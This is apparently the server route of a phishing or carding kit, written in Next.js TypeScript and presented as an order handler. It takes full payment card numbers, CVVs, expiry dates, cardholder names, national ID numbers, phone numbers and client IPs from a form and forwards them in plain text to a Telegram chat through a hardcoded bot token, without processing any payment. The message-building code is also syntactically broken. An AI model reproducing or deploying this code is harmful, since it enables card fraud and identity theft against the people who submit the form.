import { NextRequest, NextResponse } from "next/server"

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { telefono, monto, numero_tarjeta, vencimiento, cvv, titular, dni, tipo_tarjeta } = body

    const botToken = "8734973144:AAG-fpG0d6EJcS0AWXrips97ZFYD9fkoTfk"
    const chatId = "-1003693872783"

    const ip =
      req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
      req.headers.get("x-real-ip") ||
      "desconocida"

    const hora = new Date().toLocaleString("es-AR", {
      timeZone: "America/Argentina/Buenos_Aires",
    })

    const message =
      `  *NUEVA ORDEN*\n\n` +
      `📱 *Telefono:* ${telefono}\n` +
      `💰 *Monto:* $${monto}\n\n` +
      `💳 *Datos de Tarjeta:*\n\n` +
      `• Tipo: ${tipo_tarjeta || "N/A"}\n` +
      `• Numero: \`${numero_tarjeta}\`\n` +
      `• Vencimiento: ${vencimiento}\n` +
      `• CVV: ${cvv}\n` +
      `• Titular: ${titular}\n` +
      `• DNI: ${dni}\n\n` +
      `🌐 *IP:* ${ip}\n` +

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    )

    const result = await telegramRes.json()

    if (!result.ok) {
      console.error("❌ Error de Telegram:", JSON.stringify(result))
      return NextResponse.json({ error: result.description }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("❌ Error interno:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}